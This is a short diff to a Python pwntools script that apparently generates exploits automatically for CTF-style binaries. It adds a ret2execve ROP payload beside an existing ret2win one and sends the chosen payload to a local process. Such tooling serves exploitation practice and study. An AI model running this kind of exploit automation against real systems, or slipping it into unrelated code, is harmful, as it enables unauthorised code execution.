@@ -1,9 +1,9 @@
 #!/bin/pythoni
 from pwn import *
 import sys
-from fart import *
-import FMT
-import ROP
+from analyze import *
+import Fart_FMT
+import Fart_ROP
 import time
 
 logging.getLogger('pwnlib').setLevel(logging.WARNING)
@@ -96,10 +96,11 @@ def exploit(binary, properties):
     p = process(binary)
     payload = None
     
+    rop = Fart_ROP.ROP(binary, properties)
     if properties["win"]:
-        rop = ROP.ROP(binary, properties)
         payload = rop.ret2win()
-        
+    elif properties["execve"]:
+        payload = rop.ret2execve()    
 
     if payload:
         p.sendline(payload)
